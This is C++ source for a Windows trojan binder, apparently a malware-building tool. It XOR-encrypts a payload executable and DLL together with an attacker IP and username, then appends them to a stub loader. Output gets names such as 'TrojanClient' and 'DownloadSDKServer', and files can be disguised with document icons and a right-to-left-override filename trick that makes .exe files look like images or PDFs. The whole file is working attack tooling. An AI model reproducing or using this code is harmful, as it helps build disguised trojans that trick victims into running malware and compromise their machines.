#include <windows.h>
#include <iostream>
#include <lm.h>
#include "winternl.h"  
#include <Dbghelp.h>
#include "resource.h"
#include <shlwapi.h>
#include "SetIcon.h"
#include <time.h>
#include "bind.h"
#include <string.h>

#pragma comment(lib,"netapi32.lib")
#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"shlwapi.lib")

using namespace std;

#define CRYPT_KEY_SIZE 16

//#define ALTER_NAME

#define _CONSOLE

unsigned int GetCryptKey(unsigned char * pKey)
{
	SYSTEMTIME stSystime = { 0 };
	GetSystemTime(&stSystime);
	srand(GetTickCount());

	DWORD dwTickCnt[CRYPT_KEY_SIZE / sizeof(DWORD)] = { 0 };
	for (int i = 0; i < CRYPT_KEY_SIZE / sizeof(DWORD); i++)
	{
		int randno = rand();
		dwTickCnt[i] = GetTickCount()* randno;
		Sleep(20);
	}

	unsigned char * pSystemTime = (unsigned char*)&stSystime;
	unsigned char * pTickCnt = (unsigned char*)dwTickCnt;
	for (int j = 0; j < CRYPT_KEY_SIZE; j++)
	{
		pKey[j] = pSystemTime[j] ^ pTickCnt[j];
	}

	for (int i = 0; i < CRYPT_KEY_SIZE; i++)
	{
		if (pKey[i] >= 0x80)
		{
			pKey[i] = pKey[i] - 0x80;
		}
	}
	return TRUE;
}

void CryptData(unsigned char * pdata, int size, unsigned char * pkey, int keylen) {

	for (int i = 0, j = 0; i < size;)
	{
		pdata[i] ^= pkey[j];
		j++;
		if (j == keylen)
		{
			j = 0;
		}
		i++;
	}
}




int MyCopyFile(const char * szsrcfile,const char * szdstfile){
	HANDLE hfsrc = CreateFileA(szsrcfile, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hfsrc == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	HANDLE hfdst = CreateFileA(szdstfile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hfdst == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hfsrc);
		return FALSE;
	}

	int srcfilesize = GetFileSize(hfsrc, 0);
	char * lpsrcdata = new char[srcfilesize + 1024];
	DWORD dwcnt = 0;
	int ret = ReadFile(hfsrc, lpsrcdata, srcfilesize, &dwcnt, 0);
	CloseHandle(hfsrc);

	ret = WriteFile(hfdst, lpsrcdata, srcfilesize, &dwcnt, 0);
	CloseHandle(hfdst);
	delete[] lpsrcdata;
	if (dwcnt != srcfilesize) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}


int fileReader(const char * fn, char ** lpbuf, int * filesize) {
	FILE * fp = fopen(fn, "rb");
	if (fp <= 0) {
		return -1;
	}

	fseek(fp, 0, FILE_END);
	*filesize = ftell(fp);
	fseek(fp, 0, FILE_BEGIN);
	if (*filesize <= 0)
	{
		fclose(fp);
		return FALSE;
	}

	*lpbuf = new char[*filesize + 1024];

	int ret = fread(*lpbuf, 1, *filesize, fp);
	fclose(fp);

	*(*lpbuf + *filesize) = 0;
	return ret;
}

int BindFiles(string exefn,string docfn,string icofn,string mainname,string surfixname,string username,string ip,int id,string path) {
	int ret = 0;
	char szlog[1024];

	if (exefn == "" || docfn == "")
	{
		return FALSE;
	}

	if (mainname == "")
	{
		mainname = "template";
	}

	if (mainname.back() >= '0' && mainname.back() <= '9')
	{
		mainname = mainname.append("add");
	}

	if (surfixname == "")
	{
		surfixname = ".png";
	}

	string bindexepath = "";
	string newexefn = "";
	if (id == IDC_BINDDLL)
	{
		bindexepath = path + "unbind.dll";
		newexefn = path + mainname + ".dll";
	}else if (id == IDBIND)
	{
		bindexepath = path + "unbind.exe";
		newexefn = path + mainname + ".exe";
	}
	else {
		MessageBoxA(0, "not recognized bind id", "not recognized id", MB_OK);
		return FALSE;
	}

	if (icofn != "")
	{
		ChangeIcon(bindexepath.c_str(), icofn.c_str());
	}


	char * lpexe = 0;
	int exefs = 0;
	ret = fileReader(exefn.c_str(), &lpexe, &exefs);
	if (ret <= FALSE)
	{
		wsprintfA(szlog, "open exe file:%s error", exefn.c_str());
		MessageBoxA(0, szlog, szlog, MB_OK);
		return FALSE;
	}

	char * lpdoc = 0;
	int docfs = 0;
	ret = fileReader(docfn.c_str(), &lpdoc, &docfs);
	if (ret <= FALSE)
	{
		wsprintfA(szlog, "open doc file:%s error", exefn.c_str());
		MessageBoxA(0, szlog, szlog, MB_OK);
		return FALSE;
	}

	
	ret = MyCopyFile(bindexepath.c_str(), newexefn.c_str());
	if (ret == FALSE)
	{
		wsprintfA(szlog, "copy bind exe file:%s to file:%s error:%u",bindexepath.c_str(),newexefn.c_str(), GetLastError());
		MessageBoxA(0, szlog, szlog, MB_OK);
		return FALSE;
	}

	HANDLE hfnewexe = CreateFileA(newexefn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hfnewexe == INVALID_HANDLE_VALUE)
	{
		wsprintfA(szlog, "CreateFileA:%s error:%u", newexefn.c_str(), GetLastError());
		MessageBoxA(0, szlog, szlog, MB_OK);
		return FALSE;
	}

	ret = SetFilePointer(hfnewexe, 0, 0, FILE_END);

	DWORD dwcnt = 0;

	unsigned char key[CRYPT_KEY_SIZE];
	GetCryptKey(key);

	char params[64] = { 0 };
	ATTACK_RUN_PARAM runparam = { 0 };
	lstrcpyA(runparam.username, username.c_str());
	lstrcpyA(runparam.ip, ip.c_str());
	memcpy(params, (char*)&runparam, sizeof(ATTACK_RUN_PARAM));
	CryptData((unsigned char*)params, 64, key, CRYPT_KEY_SIZE);
	ret = WriteFile(hfnewexe, params, 64, &dwcnt, 0);

	CryptData((unsigned char*)lpexe, exefs, key, CRYPT_KEY_SIZE);

	ret = WriteFile(hfnewexe, lpexe, exefs, &dwcnt, 0);
	ret = WriteFile(hfnewexe, &exefs, sizeof(DWORD), &dwcnt, 0);

	char szexefn[MAX_PATH] = { 0 };
	lstrcpyA(szexefn, exefn.c_str());
	PathStripPathA(szexefn);
	int exefnlen = lstrlenA(szexefn);

	CryptData((unsigned char*)szexefn, exefnlen, key, CRYPT_KEY_SIZE);

	ret = WriteFile(hfnewexe, szexefn, exefnlen, &dwcnt, 0);

	ret = WriteFile(hfnewexe, &exefnlen, sizeof(int), &dwcnt, 0);



	CryptData((unsigned char*)lpdoc, docfs, key, CRYPT_KEY_SIZE);
	ret = WriteFile(hfnewexe, lpdoc, docfs, &dwcnt, 0);

	ret = WriteFile(hfnewexe, &docfs,sizeof(int),&dwcnt,0);

	char szdocfn[MAX_PATH] = { 0 };
	lstrcpyA(szdocfn, docfn.c_str());
	PathStripPathA(szdocfn);
	int docfnlen = lstrlenA(szdocfn);

	CryptData((unsigned char*)szdocfn, docfnlen, key, CRYPT_KEY_SIZE);
	ret = WriteFile(hfnewexe, szdocfn, docfnlen, &dwcnt, 0);

	ret = WriteFile(hfnewexe, &docfnlen, sizeof(int), &dwcnt, 0);


	ret = WriteFile(hfnewexe, &key, CRYPT_KEY_SIZE, &dwcnt, 0);
	CloseHandle(hfnewexe);

	delete lpdoc;
	delete lpexe;

#ifdef ALTER_NAME
	char sznewfn[MAX_PATH] = { 0 };
	lstrcpyA(sznewfn, path.c_str());
	lstrcatA(sznewfn, mainname.c_str());
	
	wchar_t wsznewfn[1024] = { 0 };
	ret = MultiByteToWideChar(CP_ACP, 0, sznewfn, lstrlenA(sznewfn), wsznewfn, 1024);
	int wsznewlen = lstrlenW(wsznewfn);
	wsznewfn[wsznewlen] = 0x202e;
	wsznewlen++;

	if (surfixname.at(0) == '.')
	{
		surfixname = surfixname.substr(1);
	}

	char szsurfix[MAX_PATH] = { 0 };
	for (int j = 0,i = surfixname.length() - 1;i >= 0; i --,j ++)
	{
		szsurfix[j] = surfixname.at(i);
	}

	string surfix = string(szsurfix) + ".exe";
	wchar_t wszsurfix[1024] = { 0 };
	ret = MultiByteToWideChar(CP_ACP, 0, surfix.c_str(), surfix.length(), wszsurfix, 1024);
	memcpy(wsznewfn + wsznewlen, (char*)wszsurfix, surfix.length()*2);


// 	if (strstr(icofn.c_str(), "doc.ico"))
// 	{
// 		memmove(wsznewfn + wszlen + 1, L"cod.exe", 14);
// 	}
// 	else if (strstr(icofn.c_str(), "bmp.ico"))
// 	{
// 		memmove(wsznewfn + wszlen + 1, L"pmb.exe", 14);
// 	}
// 	else if (strstr(icofn.c_str(), "pdf.ico"))
// 	{
// 		memmove(wsznewfn + wszlen + 1, L"fdp.exe",14);
// 	}
// 	else if (strstr(icofn.c_str(), "music.ico"))
// 	{
// 		memmove(wsznewfn + wszlen + 1, L"3pm.exe", 14);
// 	}
// 	else if (strstr(icofn.c_str(), "movie.ico"))
// 	{
// 		memmove(wsznewfn + wszlen + 1, L"4pm.exe", 14);
// 	}
// 	else {
// 		memmove(wsznewfn + wszlen + 1, L"gnp.exe", 14);
// 	}

	HANDLE hfunicode = CreateFileW(wsznewfn, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	HANDLE hfasc = CreateFileA(newexefn.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	int newexefs = GetFileSize(hfasc, 0);
	char * newexefilebuf = new char[newexefs + 1024];
	ret = ReadFile(hfasc, newexefilebuf, newexefs, &dwcnt, 0);
	ret = WriteFile(hfunicode, newexefilebuf, newexefs, &dwcnt, 0);
	CloseHandle(hfasc);
	CloseHandle(hfunicode);

	DeleteFileA(newexefn.c_str());
#endif

#ifndef _CONSOLE
	wsprintfA(szlog,"bind exe file:%s,doc file:%s ok", exefn.c_str(),docfn.c_str());
	MessageBoxA(0, szlog, szlog, MB_OK);
#endif

	return TRUE;
}


string getPathFromFullPath(string fullname) {
	int len = fullname.length();
	for (int i = len -1;i >= 0; i --)
	{
		if (fullname.at(i) == '\\' || fullname.at(i) == '/')
		{
			string path = fullname.substr(0, i + 1);
			return path;
		}
	}

	return "";
}





#ifdef _CONSOLE
#define WORK_PATH "\\"

int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp) {

	int ret = 0;

	char szexepath[MAX_PATH] = { 0 };
	ret = GetModuleFileNameA(0, szexepath, MAX_PATH);

	string workpath = argv[3];
	if (workpath == "")
	{
		workpath = getPathFromFullPath(szexepath);
	}else if (workpath.back() != '/' && workpath.back() != '\\')
	{
		workpath += "/";
	}
	
	string username = argv[2];
	string ip = argv[1];

	string mainfn = "TrojanClient";

	string bindpefn = workpath + "sogou.exe";
	string binddllfn = workpath + "sbiedll.dll";

	ret = BindFiles(bindpefn, binddllfn, "", mainfn, "", username,ip, IDC_BINDDLL, workpath);

	ret = BindFiles(bindpefn, binddllfn, "", mainfn, "", username,ip, IDBIND, workpath);



	ret = BindFiles(bindpefn, binddllfn, "", "minibrowser_shell", "", username, ip, IDC_BINDDLL, workpath);

	ret = BindFiles(bindpefn, binddllfn, "", "DownloadSDKServer", "", username, ip, IDBIND, workpath);

	return 0;
}
#else
int OpenFileName(HWND hwnd, int id) {
	char szFileName[MAX_PATH] = { 0 };

	OPENFILENAMEA Ofn = { 0 };
	Ofn.lStructSize = sizeof(OPENFILENAME);
	Ofn.hwndOwner = hwnd;
	Ofn.lpstrFilter = "ALL FILES(*.*)\0*.*\0\0";
	Ofn.lpstrFile = szFileName;
	Ofn.nMaxFile = MAX_PATH;
	Ofn.lpstrFileTitle = szFileName;
	Ofn.nMaxFileTitle = MAX_PATH;
	Ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
	Ofn.lpstrInitialDir = 0;
	Ofn.lpstrTitle = "À¦°óÆ÷ÎÄ¼þ²éÕÒ";
	int ret = GetOpenFileNameA(&Ofn);
	if (ret)
	{
		ret = SetDlgItemTextA(hwnd, id, szFileName);
	}
	return ret;
}


int __stdcall DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg == WM_INITDIALOG)
	{
		//HWND hexe = GetDlgItem(hWnd, IDC_EDIT1);
		//HWND hdoc = GetDlgItem(hWnd, IDC_EDIT2);
		//DragAcceptFiles(hexe, TRUE);
		//DragAcceptFiles(hdoc, TRUE);
		DragAcceptFiles(hWnd, TRUE);
		return TRUE;
	}
	else if (uMsg == WM_CLOSE)
	{
		EndDialog(hWnd, 0);
		return TRUE;
	}
	else if (uMsg == WM_DROPFILES)
	{
		HDROP hDrop = (HDROP)wParam;
		UINT Cnt = DragQueryFileA(hDrop, 0xffffffff, 0, 0);
		if ((Cnt > 1 || Cnt <= 0))
		{
			return TRUE;
		}

		char szFileName[MAX_PATH] = { 0 };
		for (int i = 0; i < (int)Cnt; i++)
		{
			int FileNameLen = DragQueryFileA(hDrop, i, szFileName, MAX_PATH);

			//SetWindowTextA(hWnd, szFileName);
			int ret = 0;
			if (memcmp(szFileName + strlen(szFileName) - 4, ".exe", 4) == 0 || memcmp(szFileName + strlen(szFileName) - 4, ".com", 4) == 0)
			{
				ret = SetDlgItemTextA(hWnd, IDC_EDIT1, szFileName);
			}
			else if (memcmp(szFileName + strlen(szFileName) - 4, ".ico", 4) == 0)
			{
				ret = SetDlgItemTextA(hWnd, IDC_EDIT3, szFileName);
			}
			else if (memcmp(szFileName + strlen(szFileName) - 4, ".dll", 4) == 0) {
				ret = SetDlgItemTextA(hWnd, IDC_EDIT2, szFileName);
			}
			else
			{
				ret = SetDlgItemTextA(hWnd, IDC_EDIT2, szFileName);
			}

			ret = GetLastError();
		}

		DragFinish(hDrop);
		return TRUE;
	}
	else if (uMsg == WM_COMMAND)
	{
		int id = wParam & 0xffff;
		if (id == IDBIND || id == IDC_BINDDLL)
		{
			char szexe[MAX_PATH];
			char szdoc[MAX_PATH];
			char szico[MAX_PATH];
			char szmainname[MAX_PATH];
			char szsurfixname[MAX_PATH];
			char szusername[MAX_PATH];

			int ret = GetDlgItemTextA(hWnd, IDC_EDIT1, szexe, MAX_PATH);
			ret = GetDlgItemTextA(hWnd, IDC_EDIT2, szdoc, MAX_PATH);

			ret = GetDlgItemTextA(hWnd, IDC_EDIT3, szico, MAX_PATH);

			ret = GetDlgItemTextA(hWnd, IDC_EDIT4, szmainname, MAX_PATH);

			ret = GetDlgItemTextA(hWnd, IDC_EDIT5, szsurfixname, MAX_PATH);

			ret = GetDlgItemTextA(hWnd, IDC_EDIT6, szusername, MAX_PATH);

			ret = BindFiles(szexe, szdoc, szico, szmainname, szsurfixname, szusername, "", id);
			return TRUE;
		}
		else if (id == IDC_BUTTON1)
		{
			int ret = OpenFileName(hWnd, IDC_EDIT1);
			return TRUE;
		}
		else if (id == IDC_BUTTON2)
		{
			int ret = OpenFileName(hWnd, IDC_EDIT2);
			return TRUE;
		}
		else if (id == IDC_BUTTON3)
		{
			int ret = OpenFileName(hWnd, IDC_EDIT3);
			return TRUE;
		}
		else {
			return FALSE;
		}
	}

	return FALSE;
}


int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {

	DialogBoxParamA(hInstance, (CHAR *)IDD_DIALOG1, 0, DlgMain, 0);

	ExitProcess(0);
	return 0;
}
#endif